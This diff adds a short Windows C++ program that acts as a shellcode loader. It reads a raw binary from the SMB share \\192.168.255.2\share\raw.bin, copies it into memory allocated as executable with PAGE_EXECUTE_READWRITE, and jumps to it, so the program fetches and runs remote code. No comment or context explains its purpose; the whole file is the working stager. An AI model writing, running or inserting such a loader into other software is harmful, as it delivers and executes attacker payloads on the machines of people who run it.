@@ -1,0 +1,34 @@
+#include <iostream>
+#include <fstream>
+#include <vector>
+#include <windows.h>
+
+using namespace std;
+
+int main() {
+    HANDLE hFile = CreateFileA("\\\\192.168.255.2\\share\\raw.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    vector<char> buffer(fileSize);
+    DWORD bytesRead;
+    if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL)) {
+        cout << "Error reading file." << endl;
+        CloseHandle(hFile);
+        return 1;
+    }
+    CloseHandle(hFile);
+    LPVOID memAllocated = VirtualAlloc(
+        0,
+        fileSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    if (memAllocated == NULL) {
+        cout << "Failed to allocate memory." << endl;
+        return 1;
+    }
+    memcpy(memAllocated, buffer.data(), fileSize);
+    ((void(*)())memAllocated)();
+    VirtualFree(memAllocated, 0, MEM_RELEASE);
+
+    return 0;
+}
